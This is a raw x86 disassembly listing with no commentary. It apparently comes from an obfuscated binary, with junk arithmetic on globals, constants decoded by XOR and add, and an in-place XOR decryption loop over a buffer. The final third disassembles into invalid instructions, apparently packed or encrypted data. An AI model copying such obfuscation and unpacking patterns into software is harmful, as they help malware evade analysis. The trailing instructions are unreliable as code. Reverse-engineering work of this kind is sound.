  401df8:	xor    DWORD PTR ds:0x434008,0x435014
  401e02:	push   0x43a520
  401e07:	push   ebx
  401e08:	push   ebx
  401e09:	call   DWORD PTR ds:0x43a8fc
  401e0f:	test   eax,eax
  401e11:	mov    DWORD PTR ds:0x435004,0x62c7
  401e1b:	jne    0x40241c
  401e21:	sub    DWORD PTR ds:0x437000,0x3add
  401e2b:	push   0xd
  401e2d:	push   0x43a530
  401e32:	call   DWORD PTR ds:0x43a908
  401e38:	test   eax,eax
  401e3a:	mov    DWORD PTR ds:0x435010,0x130a
  401e44:	jne    0x402440
  401e4a:	and    DWORD PTR ds:0x434018,0x434024
  401e54:	push   0x43a544
  401e59:	push   ebx
  401e5a:	push   ebx
  401e5b:	call   DWORD PTR ds:0x43a8ec
  401e61:	test   eax,eax
  401e63:	mov    DWORD PTR ds:0x436008,0x3823
  401e6d:	jne    0x402440
  401e73:	adc    DWORD PTR ds:0x436014,0x437014
  401e7d:	push   0x9
  401e7f:	sub    DWORD PTR ds:0x437014,0x437010
  401e89:	push   0x43a55c
  401e8e:	call   DWORD PTR ds:0x43a8cc
  401e94:	not    DWORD PTR ds:0x43800c
  401e9a:	test   eax,eax
  401e9c:	mov    DWORD PTR ds:0x43501c,0x69de
  401ea6:	jne    0x40241c
  401eac:	sbb    DWORD PTR ds:0x436018,0x435008
  401eb6:	push   0x43a578
  401ebb:	push   ebx
  401ebc:	sub    DWORD PTR ds:0x438018,0x435008
  401ec6:	push   ebx
  401ec7:	call   DWORD PTR ds:0x43a8fc
  401ecd:	test   eax,eax
  401ecf:	mov    DWORD PTR ds:0x435018,0x17d7
  401ed9:	jne    0x40241c
  401edf:	sub    DWORD PTR ds:0x436010,0x435008
  401ee9:	push   0xd
  401eeb:	adc    DWORD PTR ds:0x43700c,0x43400c
  401ef5:	push   0x43a588
  401efa:	sbb    DWORD PTR ds:0x437014,0x437000
  401f04:	call   DWORD PTR ds:0x43a908
  401f0a:	test   eax,eax
  401f0c:	mov    DWORD PTR ds:0x434024,0x6a5c
  401f16:	jne    0x402440
  401f1c:	mov    eax,DWORD PTR [ebp-0x8]
  401f1f:	and    DWORD PTR ds:0x43500c,0x0
  401f29:	mov    ecx,DWORD PTR ds:0x43500c
  401f2f:	inc    ecx
  401f30:	mov    DWORD PTR ds:0x43500c,ecx
  401f36:	cmp    DWORD PTR ds:0x43500c,0x9
  401f3d:	ja     0x401f75
  401f43:	jmp    0x401f4e
  401f48:	call   DWORD PTR ds:0x43a904
  401f4e:	cmp    DWORD PTR ds:0x43500c,0x8
  401f55:	jne    0x401f68
  401f5b:	mov    ecx,DWORD PTR ds:0x43500c
  401f61:	inc    ecx
  401f62:	mov    DWORD PTR ds:0x43500c,ecx
  401f68:	cmp    DWORD PTR ds:0x43500c,0x14
  401f6f:	jb     0x401f29
  401f75:	mov    ecx,DWORD PTR [ebp-0x7c]
  401f78:	xor    eax,esi
  401f7a:	dec    DWORD PTR ds:0x43700c
  401f80:	add    eax,edi
  401f82:	mov    DWORD PTR ds:0x434010,0x1014
  401f8c:	cmp    eax,ecx
  401f8e:	jne    0x4023c3
  401f94:	sbb    DWORD PTR ds:0x437018,0x6417
  401f9e:	mov    eax,DWORD PTR [ebp-0x8]
  401fa1:	mov    ecx,DWORD PTR ds:0x43a2d4
  401fa7:	and    DWORD PTR ds:0x438014,0xc31
  401fb1:	mov    ecx,DWORD PTR [ecx+0x198]
  401fb7:	xor    eax,esi
  401fb9:	sub    DWORD PTR ds:0x436008,0x435010
  401fc3:	add    eax,edi
  401fc5:	cmp    eax,DWORD PTR [ecx]
  401fc7:	jne    0x402025
  401fcd:	movzx  eax,WORD PTR ds:0x435014
  401fd4:	and    DWORD PTR ds:0x434010,eax
  401fda:	mov    eax,DWORD PTR [ebp-0x8]
  401fdd:	adc    DWORD PTR ds:0x434018,0x436008
  401fe7:	push   0xf89c8585
  401fec:	xor    eax,esi
  401fee:	add    eax,edi
  401ff0:	adc    DWORD PTR ds:0x437018,0x127f
  401ffa:	push   eax
  401ffb:	dec    DWORD PTR ds:0x436004
  402001:	push   0xf89c85b9
  402006:	sbb    DWORD PTR ds:0x43501c,0x43600c
  402010:	push   DWORD PTR [ebp-0xc]
  402013:	and    DWORD PTR ds:0x434024,0x7b2c
  40201d:	push   DWORD PTR [ebp-0x8]
  402020:	call   0x407a51
  402025:	mov    eax,DWORD PTR [ebp-0xc]
  402028:	mov    DWORD PTR [ebp-0x4c],eax
  40202b:	mov    eax,DWORD PTR [ebp-0x8]
  40202e:	mov    DWORD PTR [ebp-0x60],eax
  402031:	mov    eax,DWORD PTR [ebp-0x60]
  402034:	xor    eax,esi
  402036:	add    eax,edi
  402038:	mov    DWORD PTR [ebp+0x10],eax
  40203b:	mov    eax,ds:0x43a154
  402040:	mov    eax,DWORD PTR [eax]
  402042:	mov    DWORD PTR [ebp+0x10],eax
  402045:	mov    eax,ds:0x43a35c
  40204a:	mov    eax,DWORD PTR [eax]
  40204c:	mov    DWORD PTR [ebp-0x18],eax
  40204f:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402056:	mov    eax,DWORD PTR [ebp+0xc]
  402059:	xor    eax,esi
  40205b:	add    eax,edi
  40205d:	mov    DWORD PTR [ebp+0xc],eax
  402060:	mov    eax,ds:0x43a2d4
  402065:	mov    DWORD PTR [ebp+0xc],eax
  402068:	mov    eax,DWORD PTR [ebp+0x10]
  40206b:	mov    DWORD PTR [ebp+0xc],eax
  40206e:	mov    eax,DWORD PTR [ebp+0xc]
  402071:	push   0x4
  402073:	pop    ecx
  402074:	sub    ecx,eax
  402076:	add    ecx,DWORD PTR [ebp-0x18]
  402079:	mov    DWORD PTR [ebp-0x38],0xf89c85c5
  402080:	mov    DWORD PTR [ebp+0x10],ecx
  402083:	mov    DWORD PTR [ebp-0x108],0xf89c85b9
  40208d:	mov    eax,DWORD PTR [ebp+0xc]
  402090:	mov    DWORD PTR [ebp-0x104],eax
  402096:	mov    eax,DWORD PTR [ebp+0x10]
  402099:	mov    DWORD PTR [ebp-0x100],eax
  40209f:	mov    eax,DWORD PTR [ebp-0x38]
  4020a2:	xor    eax,esi
  4020a4:	add    eax,edi
  4020a6:	mov    DWORD PTR [ebp-0xfc],eax
  4020ac:	lea    eax,[ebp-0x98]
  4020b2:	mov    DWORD PTR [ebp-0xf8],eax
  4020b8:	mov    eax,DWORD PTR [ebp-0x108]
  4020be:	xor    eax,esi
  4020c0:	add    eax,edi
  4020c2:	mov    DWORD PTR [ebp-0x108],eax
  4020c8:	lea    eax,[ebp-0x108]
  4020ce:	push   eax
  4020cf:	mov    eax,DWORD PTR [ebp-0x4c]
  4020d2:	xor    eax,esi
  4020d4:	add    eax,edi
  4020d6:	push   eax
  4020d7:	mov    eax,ds:0x43a2f4
  4020dc:	push   0x43a24a
  4020e1:	push   DWORD PTR [eax]
  4020e3:	call   0x404c64
  4020e8:	mov    eax,DWORD PTR [ebp+0xc]
  4020eb:	mov    ecx,DWORD PTR [ebp+0x10]
  4020ee:	mov    DWORD PTR [ebp-0x84],ecx
  4020f4:	mov    ecx,DWORD PTR [ebp-0x60]
  4020f7:	xor    ecx,esi
  4020f9:	mov    DWORD PTR [ebp-0x18],eax
  4020fc:	add    ecx,edi
  4020fe:	jmp    0x402361
  402103:	lea    edx,[ecx+eax*1]
  402106:	mov    DWORD PTR [ebp+0x10],edx
  402109:	mov    edx,DWORD PTR [ebp-0x84]
  40210f:	sub    edx,ecx
  402111:	mov    DWORD PTR [ebp+0xc],edx
  402114:	mov    edx,DWORD PTR [ebp+0xc]
  402117:	mov    DWORD PTR [ebp-0x54],edx
  40211a:	mov    edx,DWORD PTR [ebp+0x10]
  40211d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  402124:	mov    DWORD PTR [ebp-0x6c],edx
  402127:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  40212e:	mov    edx,DWORD PTR [ebp-0x50]
  402131:	xor    edx,esi
  402133:	add    edx,edi
  402135:	mov    DWORD PTR [ebp+0x10],edx
  402138:	mov    edx,DWORD PTR [ebp-0x50]
  40213b:	xor    edx,esi
  40213d:	add    edx,edi
  40213f:	mov    DWORD PTR [ebp+0xc],edx
  402142:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402149:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  402150:	mov    edx,DWORD PTR [ebp-0x50]
  402153:	mov    ebx,DWORD PTR [ebp-0x54]
  402156:	xor    edx,esi
  402158:	add    edx,edi
  40215a:	cmp    ebx,edx
  40215c:	je     0x402355
  402162:	mov    eax,DWORD PTR [ebp-0x24]
  402165:	xor    eax,esi
  402167:	mov    edx,0xffcd8d1e
  40216c:	sub    edx,eax
  40216e:	add    edx,DWORD PTR [ebp-0x54]
  402171:	mov    eax,DWORD PTR [ebp-0x24]
  402174:	mov    ebx,DWORD PTR [ebp+0x10]
  402177:	xor    eax,esi
  402179:	add    eax,edi
  40217b:	imul   eax,ebx
  40217e:	cmp    eax,edx
  402180:	ja     0x402352
  402186:	mov    edx,DWORD PTR [ebp+0x10]
  402189:	mov    eax,DWORD PTR [ebp-0x54]
  40218c:	mov    ebx,DWORD PTR [ebp-0x68]
  40218f:	sub    eax,edx
  402191:	xor    ebx,esi
  402193:	xor    edx,edx
  402195:	add    ebx,edi
  402197:	div    ebx
  402199:	mov    DWORD PTR [ebp+0xc],eax
  40219c:	mov    eax,DWORD PTR [ebp-0x74]
  40219f:	mov    edx,DWORD PTR [ebp+0xc]
  4021a2:	xor    eax,esi
  4021a4:	add    eax,edi
  4021a6:	cmp    edx,eax
  4021a8:	jbe    0x4021b8
  4021ae:	mov    eax,DWORD PTR [ebp-0x74]
  4021b1:	xor    eax,esi
  4021b3:	add    eax,edi
  4021b5:	mov    DWORD PTR [ebp+0xc],eax
  4021b8:	mov    eax,DWORD PTR [ebp-0x68]
  4021bb:	mov    edx,DWORD PTR [ebp+0xc]
  4021be:	xor    eax,esi
  4021c0:	add    eax,edi
  4021c2:	imul   eax,edx
  4021c5:	mov    DWORD PTR [ebp+0xc],eax
  4021c8:	mov    eax,DWORD PTR [ebp-0x50]
  4021cb:	mov    edx,DWORD PTR [ebp+0xc]
  4021ce:	xor    eax,esi
  4021d0:	add    eax,edi
  4021d2:	cmp    edx,eax
  4021d4:	je     0x40233b
  4021da:	mov    eax,DWORD PTR [ebp+0xc]
  4021dd:	mov    DWORD PTR [ebp-0x3c],eax
  4021e0:	mov    eax,DWORD PTR [ebp+0x10]
  4021e3:	add    eax,DWORD PTR [ebp-0x6c]
  4021e6:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  4021ed:	mov    DWORD PTR [ebp-0x30],eax
  4021f0:	mov    eax,0xf89c8584
  4021f5:	mov    DWORD PTR [ebp-0x64],eax
  4021f8:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4021ff:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402206:	mov    DWORD PTR [ebp-0x2c],eax
  402209:	mov    eax,DWORD PTR [ebp-0x38]
  40220c:	xor    eax,esi
  40220e:	add    eax,edi
  402210:	jmp    0x4022f7
  402215:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  40221c:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  402223:	mov    eax,DWORD PTR [ebp-0x2c]
  402226:	mov    edx,DWORD PTR [ebp+0xc]
  402229:	xor    eax,esi
  40222b:	add    eax,edi
  40222d:	imul   eax,edx
  402230:	mov    edx,DWORD PTR [ebp-0x30]
  402233:	mov    al,BYTE PTR [eax+edx*1]
  402236:	mov    BYTE PTR [ebp-0x1],al
  402239:	mov    eax,DWORD PTR [ebp-0x2c]
  40223c:	mov    edx,DWORD PTR [ebp+0xc]
  40223f:	xor    eax,esi
  402241:	add    eax,edi
  402243:	imul   eax,edx
  402246:	mov    edx,DWORD PTR [ebp-0x58]
  402249:	xor    edx,esi
  40224b:	add    eax,edx
  40224d:	mov    edx,DWORD PTR [ebp-0x30]
  402250:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402258:	mov    edx,DWORD PTR [ebp-0x78]
  40225b:	xor    edx,esi
  40225d:	lea    eax,[edx+eax*1+0x3272e2]
  402264:	movzx  edx,BYTE PTR [ebp-0x1]
  402268:	xor    edx,eax
  40226a:	mov    BYTE PTR [ebp-0x1],dl
  40226d:	mov    al,BYTE PTR [ebp-0x1]
  402270:	mov    edx,DWORD PTR [ebp-0x2c]
  402273:	mov    ebx,DWORD PTR [ebp+0xc]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	imul   edx,ebx
  40227d:	mov    ebx,DWORD PTR [ebp-0x30]
  402280:	mov    BYTE PTR [edx+ebx*1],al
  402283:	mov    eax,DWORD PTR [ebp-0x2c]
  402286:	mov    edx,DWORD PTR [ebp+0xc]
  402289:	xor    eax,esi
  40228b:	add    eax,edi
  40228d:	imul   eax,edx
  402290:	mov    edx,DWORD PTR [ebp-0x30]
  402293:	mov    al,BYTE PTR [eax+edx*1]
  402296:	mov    BYTE PTR [ebp-0x1],al
  402299:	mov    eax,DWORD PTR [ebp-0x2c]
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	xor    eax,esi
  4022a1:	add    eax,edi
  4022a3:	imul   eax,edx
  4022a6:	mov    edx,DWORD PTR [ebp-0x64]
  4022a9:	xor    edx,esi
  4022ab:	add    eax,edx
  4022ad:	mov    edx,DWORD PTR [ebp-0x30]
  4022b0:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  4022b8:	mov    edx,DWORD PTR [ebp-0x80]
  4022bb:	xor    edx,esi
  4022bd:	lea    eax,[edx+eax*1+0x3272e2]
  4022c4:	movzx  edx,BYTE PTR [ebp-0x1]
  4022c8:	xor    edx,eax
  4022ca:	mov    BYTE PTR [ebp-0x1],dl
  4022cd:	mov    al,BYTE PTR [ebp-0x1]
  4022d0:	mov    edx,DWORD PTR [ebp-0x2c]
  4022d3:	mov    ebx,DWORD PTR [ebp+0xc]
  4022d6:	xor    edx,esi
  4022d8:	add    edx,edi
  4022da:	imul   edx,ebx
  4022dd:	mov    ebx,DWORD PTR [ebp-0x30]
  4022e0:	mov    BYTE PTR [edx+ebx*1],al
  4022e3:	mov    eax,DWORD PTR [ebp-0x10]
  4022e6:	mov    edx,DWORD PTR [ebp-0x64]
  4022e9:	xor    eax,esi
  4022eb:	xor    edx,esi
  4022ed:	add    eax,edi
  4022ef:	add    edx,edi
  4022f1:	imul   eax,edx
  4022f4:	add    eax,DWORD PTR [ebp+0xc]
  4022f7:	mov    DWORD PTR [ebp+0xc],eax
  4022fa:	mov    eax,DWORD PTR [ebp+0xc]
  4022fd:	mov    edx,DWORD PTR [ebp-0x3c]
  402300:	cmp    edx,eax
  402302:	jb     0x402215
  402308:	mov    eax,DWORD PTR [ebp-0x64]
  40230b:	mov    edx,DWORD PTR [ebp-0x3c]
  40230e:	xor    eax,esi
  402310:	add    eax,edi
  402312:	imul   eax,edx
  402315:	mov    edx,DWORD PTR [ebp-0x38]
  402318:	xor    edx,esi
  40231a:	add    edx,edi
  40231c:	or     eax,edx
  40231e:	mov    edx,DWORD PTR [ebp-0x24]
  402321:	xor    edx,esi
  402323:	add    eax,edx
  402325:	mov    edx,DWORD PTR [ebp-0x24]
  402328:	xor    edx,esi
  40232a:	add    eax,edx
  40232c:	mov    edx,DWORD PTR [ebp+0x10]
  40232f:	lea    eax,[eax+edx*1+0x64e5c4]
  402336:	jmp    0x40234a
  40233b:	mov    eax,DWORD PTR [ebp-0x24]
  40233e:	mov    edx,DWORD PTR [ebp+0x10]
  402341:	xor    eax,esi
  402343:	lea    eax,[eax+edx*1+0x3272e2]
  40234a:	mov    DWORD PTR [ebp+0x10],eax
  40234d:	jmp    0x402162
  402352:	mov    eax,DWORD PTR [ebp-0x18]
  402355:	mov    edx,DWORD PTR [ebp-0x4c]
  402358:	xor    edx,esi
  40235a:	lea    ecx,[ecx+edx*1+0x3272e2]
  402361:	lea    edx,[ecx-0x3272e2]
  402367:	xor    edx,esi
  402369:	cmp    edx,0xf89c9585
  40236f:	jne    0x402103
  402375:	mov    ecx,DWORD PTR [ebp-0x60]
  402378:	mov    edx,DWORD PTR [ebp-0x4c]
  40237b:	mov    ebx,DWORD PTR [ebp-0x60]
  40237e:	xor    edx,esi
  402380:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402387:	xor    ecx,esi
  402389:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  402390:	xor    ebx,esi
  402392:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402399:	mov    edx,DWORD PTR [ebp-0x4c]
  40239c:	xor    edx,esi
  40239e:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  4023a5:	mov    eax,DWORD PTR [ebp-0x4c]
  4023a8:	mov    eax,DWORD PTR [ebp-0x8]
  4023ab:	xor    eax,esi
  4023ad:	add    eax,edi
  4023af:	mov    ds:0x43a358,eax
  4023b4:	mov    eax,DWORD PTR [ebp-0x8]
  4023b7:	xor    eax,esi
  4023b9:	add    eax,edi
  4023bb:	xor    ebx,ebx
  4023bd:	mov    ds:0x43a350,eax
  4023c2:	inc    ebx
  4023c3:	lea    eax,[ebp-0x40]
  4023c6:	mov    DWORD PTR [ebp-0x88],eax
  4023cc:	lea    eax,[ebp+0x4]
  4023cf:	mov    DWORD PTR [ebp-0x40],eax
  4023d2:	mov    eax,DWORD PTR [ebp-0x40]
  4023d5:	test   eax,eax
  4023d7:	je     0x402572
  4023dd:	push   0x43a59c
  4023e2:	push   ebx
  4023e3:	push   ebx
  4023e4:	call   DWORD PTR ds:0x43a8ec
  4023ea:	test   eax,eax
  4023ec:	jne    0x402440
  4023f2:	push   0x9
  4023f4:	push   0x43a5b4
  4023f9:	call   DWORD PTR ds:0x43a8cc
  4023ff:	test   eax,eax
  402401:	jne    0x40241c
  402407:	push   0x43a5d0
  40240c:	push   ebx
  40240d:	push   ebx
  40240e:	call   DWORD PTR ds:0x43a8fc
  402414:	test   eax,eax
  402416:	je     0x40242b
  40241c:	lea    eax,[ebp-0x20]
  40241f:	push   eax
  402420:	call   DWORD PTR ds:0x43a8bc
  402426:	jmp    0x40258d
  40242b:	push   0xd
  40242d:	push   0x43a5e0
  402432:	call   DWORD PTR ds:0x43a908
  402438:	test   eax,eax
  40243a:	je     0x402447
  402440:	xor    eax,eax
  402442:	jmp    0x40258d
  402447:	mov    DWORD PTR [ebp-0x94],0xf152c3c
  402451:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  40245b:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  402465:	mov    DWORD PTR [ebp-0x90],0x72670a1d
  40246f:	call   0x405387
  402474:	mov    eax,DWORD PTR [ebp-0x28]
  402477:	mov    eax,DWORD PTR [ebp-0xc]
  40247a:	mov    eax,DWORD PTR [ebp-0x8]
  40247d:	mov    DWORD PTR [ebp+0xc],eax
  402480:	mov    eax,eax
  402482:	mov    eax,ds:0x43a2d4
  402487:	mov    eax,DWORD PTR [eax+0x1c8]
  40248d:	mov    eax,DWORD PTR [eax]
  40248f:	cdq    
  402490:	mov    ebx,eax
  402492:	mov    eax,0xfabdbee7
  402497:	add    ebx,eax
  402499:	adc    edx,0xffffffff
  40249c:	and    DWORD PTR [ebp-0x10],0x0
  4024a0:	xor    edx,0x0
  4024a3:	mov    DWORD PTR [ebp-0x6c],edx
  4024a6:	mov    edx,DWORD PTR [ebp+0xc]
  4024a9:	mov    DWORD PTR [ebp-0x14],edx
  4024ac:	mov    ecx,0x8a29a12d
  4024b1:	xor    ebx,ecx
  4024b3:	add    DWORD PTR [ebp-0x14],eax
  4024b6:	mov    edx,DWORD PTR [ebp-0x14]
  4024b9:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4024bd:	xor    edx,ecx
  4024bf:	mov    DWORD PTR [ebp-0x5c],edx
  4024c2:	mov    edx,DWORD PTR [ebp-0x10]
  4024c5:	xor    edx,0x0
  4024c8:	mov    DWORD PTR [ebp-0x58],edx
  4024cb:	cmp    DWORD PTR [ebp-0x5c],ebx
  4024ce:	jne    0x4024e0
  4024d4:	mov    edx,DWORD PTR [ebp-0x6c]
  4024d7:	cmp    DWORD PTR [ebp-0x58],edx
  4024da:	je     0x40250f
  4024e0:	mov    edx,DWORD PTR ds:0x43a2d4
  4024e6:	mov    edx,DWORD PTR [edx+0x1c0]
  4024ec:	mov    edx,DWORD PTR [edx]
  4024ee:	xor    ebx,ebx
  4024f0:	add    edx,eax
  4024f2:	adc    ebx,0xffffffff
  4024f5:	xor    edx,ecx
  4024f7:	xor    ebx,0x0
  4024fa:	cmp    edx,0x70941fc5
  402500:	jne    0x402572
  402506:	cmp    ebx,0xffffffff
  402509:	jne    0x402572
  40250f:	mov    edx,DWORD PTR ds:0x43a350
  402515:	mov    ebx,DWORD PTR ds:0x43a358
  40251b:	xor    edx,ebx
  40251d:	mov    DWORD PTR ds:0x43a350,edx
  402523:	mov    edx,DWORD PTR [ebp-0x40]
  402526:	mov    ebx,DWORD PTR ds:0x43a350
  40252c:	add    ebx,DWORD PTR [edx]
  40252e:	mov    edx,DWORD PTR [ebp-0x40]
  402531:	mov    DWORD PTR [edx],ebx
  402533:	mov    edx,DWORD PTR [ebp+0xc]
  402536:	xor    esi,edx
  402538:	mov    edx,DWORD PTR ds:0x43a350
  40253e:	add    esi,edi
  402540:	xor    ebx,ebx
  402542:	add    esi,eax
  402544:	adc    ebx,0xffffffff
  402547:	xor    edi,edi
  402549:	xor    esi,ecx
  40254b:	xor    ebx,0x0
  40254e:	add    edx,eax
  402550:	adc    edi,0xffffffff
  402553:	xor    edx,ecx
  402555:	xor    edi,0x0
  402558:	cmp    edx,esi
  40255a:	jne    0x402572
  402560:	cmp    edi,ebx
  402562:	jne    0x402572
  402568:	mov    eax,ds:0x43a350
  40256d:	mov    ds:0x43a358,eax
  402572:	mov    eax,ds:0x43a2d4
  402577:	push   0x4
  402579:	add    eax,0x1cc
  40257e:	push   eax
  40257f:	lea    eax,[ebp-0x28]
  402582:	push   eax
  402583:	call   0x402598
  402588:	mov    eax,DWORD PTR [ebp-0x28]
  40258b:	mov    eax,DWORD PTR [eax]
  40258d:	pop    edi
  40258e:	pop    ebx
  40258f:	pop    esi
  402590:	leave  
  402591:	ret    0xc
  402594:	xor    eax,eax
  402596:	inc    eax
  402597:	ret    
  402598:	push   ebp
  402599:	mov    ebp,esp
  40259b:	sub    esp,0x10
  40259e:	mov    ecx,DWORD PTR ds:0x438004
  4025a4:	sbb    ecx,DWORD PTR ds:0x434000
  4025aa:	mov    DWORD PTR ds:0x438004,ecx
  4025b0:	mov    eax,0xf89c8585
  4025b5:	add    DWORD PTR ds:0x437018,0x7358
  4025bf:	mov    DWORD PTR [ebp-0x4],eax
  4025c2:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4025c9:	movzx  edx,WORD PTR ds:0x436014
  4025d0:	sub    DWORD PTR ds:0x43701c,edx
  4025d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4025d9:	dec    edx
  4025da:	jmp    0x404996
  4025df:	sub    DWORD PTR [edx+0x13b763cc],eax
  4025e5:	jae    0x402659
  4025e7:	xchg   ecx,eax
  4025e8:	xchg   esp,eax
  4025e9:	pop    ecx
  4025ea:	int3   
  4025eb:	add    edx,0x19
  4025ee:	jns    0x40266c
  4025f0:	jl     0x40266e
  4025f2:	jl     0x4025c7
  4025f4:	pop    edi
  4025f5:	jl     0x402673
  4025f7:	adc    eax,0x1139172e
  4025fc:	and    eax,0x30652f13
  402601:	popa   
  402602:	pusha  
  402603:	push   cs
  402604:	jp     0x402672
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	xor    al,0xc5
  40260a:	fdivp  st(1),st
  40260c:	push   0x42
  40260e:	arpl   WORD PTR [ecx+0x53],di
  402611:	stos   BYTE PTR es:[edi],al
  402612:	jp     0x402681
  402614:	push   ecx
  402615:	iret   
  402616:	pop    ebp
  402617:	dec    esp
  402618:	cmp    cl,BYTE PTR [esi+0x577087fc]
  40261e:	dec    ebp
  40261f:	jg     0x402658
  402621:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402627:	jmp    DWORD PTR cs:[eax-0x22]
  40262b:	cld    
  40262c:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402630:	xor    ebp,ecx
  402632:	mov    esp,0xd82b87ed
  402637:	and    DWORD PTR [ecx],0xf
  40263a:	push   ecx
  40263b:	mov    ds:0x6df7c68c,eax
  402640:	fld    QWORD PTR [esi]
  402642:	(bad)  
  402643:	or     ah,bh
  402645:	and    BYTE PTR [edx],dl
  402647:	inc    edx
  402648:	push   cs
  402649:	and    BYTE PTR [ebx+0x62],ah
  40264c:	mov    cl,0xaf
  40264e:	sub    ebx,DWORD PTR [ecx+0x5]
  402651:	mov    al,ds:0x2341e1ff
  402656:	jbe    0x40268c
  402658:	ret    0xf153
  40265b:	sbb    al,0xfc
  40265d:	jb     0x402618
  40265f:	jnp    0x40263e
  402661:	xchg   edx,eax
  402662:	pop    edi
  402663:	cmp    DWORD PTR [ecx+0x49841607],0xb
  40266a:	cwde   
  40266b:	ds je  0x4025f9
  40266e:	add    ebx,esp
  402670:	sub    eax,0x4b368d54
  402675:	push   esi
  402676:	sti    
  402677:	iret   
  402678:	mov    WORD PTR [ecx],fs
  40267a:	or     edx,0x6982ceb7
  402680:	out    0x45,al
  402682:	push   esp
  402683:	dec    esi
  402684:	push   cs
  402685:	cmp    BYTE PTR [ebx],cl
  402687:	xor    BYTE PTR [ebx],bl
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    ebx
  40268b:	int3   
  40268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268d:	dec    edx
  40268e:	fiadd  DWORD PTR [esi]
  402690:	push   eax
  402691:	std    
  402692:	push   esp
  402693:	push   eax
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	icebp  
  402696:	bound  edi,QWORD PTR [edi+0x311f44f2]
  40269c:	loopne 0x4026c0
  40269e:	aad    0x81
  4026a0:	sub    esp,edx
  4026a2:	xor    BYTE PTR [edi+0x3b252eff],al
  4026a8:	nop
  4026a9:	xchg   BYTE PTR [ebx],bh
  4026ab:	xor    DWORD PTR [ebx-0x46d33143],ecx
  4026b1:	retf   0xc2d1
  4026b4:	adc    ecx,ebp
  4026b6:	sbb    bh,ch
  4026b8:	cwde   
  4026b9:	sti    
  4026ba:	mov    bh,0x41
  4026bc:	pop    edi
  4026bd:	pop    esi
  4026be:	aaa    
  4026bf:	ja     0x4026ca
  4026c1:	dec    ebp
  4026c2:	inc    ebx
  4026c3:	(bad)  
  4026c4:	leave  
  4026c5:	scas   eax,DWORD PTR es:[edi]
  4026c6:	jnp    0x40270f
  4026c8:	cmp    DWORD PTR [ecx-0x53],eax
  4026cb:	push   eax
  4026cc:	inc    eax
  4026cd:	mov    ds:0xcde7bc3e,al
  4026d2:	jge    0x4026b4
  4026d4:	cmp    ecx,DWORD PTR [ecx]
  4026d6:	das    
  4026d7:	pop    es
  4026d8:	push   es
  4026d9:	mov    al,0xf9
  4026db:	stos   BYTE PTR es:[edi],al
  4026dc:	in     al,0x61
  4026de:	cmp    dl,BYTE PTR [edx-0x50553e0b]
  4026e4:	or     DWORD PTR [edx],ebx
  4026e6:	dec    eax
  4026e7:	inc    ebp
  4026e8:	mov    cl,dh
  4026ea:	or     eax,0x3f5a0230
  4026ef:	push   ds
  4026f0:	or     al,0x4f
  4026f2:	jns    0x4026d3
  4026f4:	shl    cl,1
  4026f6:	aaa    
  4026f7:	adc    eax,0xe82a6640
  4026fc:	pop    esi
  4026fd:	sub    dh,BYTE PTR [esi+0x2]
  402700:	aam    0x38
  402702:	ss sub edi,ebp
  402705:	leave  
  402706:	push   edi
  402707:	and    esi,eax
  402709:	cmp    eax,0xa88a38e2
  40270e:	push   esp
  40270f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402710:	fimul  DWORD PTR [ebp+0x7f]
  402713:	mov    bl,0xb8
  402715:	repz sub ah,al
  402718:	cs jno 0x402789
  40271b:	or     al,0xe
  40271d:	jns    0x4026fa
  40271f:	jmp    0x20d6:0x16d183ea
  402726:	cdq    
  402727:	lahf   
  402728:	or     BYTE PTR [eax],0x4f
  40272b:	pop    esi
  40272c:	inc    esp
  40272d:	push   ebp
  40272e:	das    
  40272f:	pop    ss
  402730:	loop   0x4026f2
  402732:	call   0x8b00:0xa9090cbf
  402739:	std    
  40273a:	stos   BYTE PTR es:[edi],al
  40273b:	stos   BYTE PTR es:[edi],al
  40273c:	cmp    eax,0x88ab9445
  402741:	test   edi,esp
  402743:	cs (bad) 
  402745:	jp     0x402789
  402747:	dec    eax
  402748:	sar    DWORD PTR [eax+0x76],1
  40274b:	cwde   
  40274c:	add    al,0x59
  40274e:	lods   al,BYTE PTR ds:[esi]
  40274f:	or     BYTE PTR [esi],dl
  402751:	xor    eax,0x1102d295
  402756:	mov    bh,0x8f
  402758:	(bad)  
  40275a:	dec    ebp
  40275b:	cld    
  40275c:	(bad)  
  40275e:	mov    bh,0xd4
  402760:	test   eax,0x9c112fc8
  402765:	shl    BYTE PTR [edx-0x2189cff6],1
  40276b:	jne    0x40271a
  40276d:	test   eax,0xec7fe10e
  402772:	sar    cl,1
  402774:	addr16 push ebp
  402776:	sbb    al,0x8d
  402778:	je     0x402715
  40277a:	inc    edi
  40277b:	push   esi
  40277c:	mov    dl,0x6a
  40277e:	clc    
  40277f:	aad    0x57
  402781:	mov    eax,0x33ae46db
  402786:	mov    ds:0x43b60de2,al
  40278b:	mov    DWORD PTR [ebp-0x5e],ecx
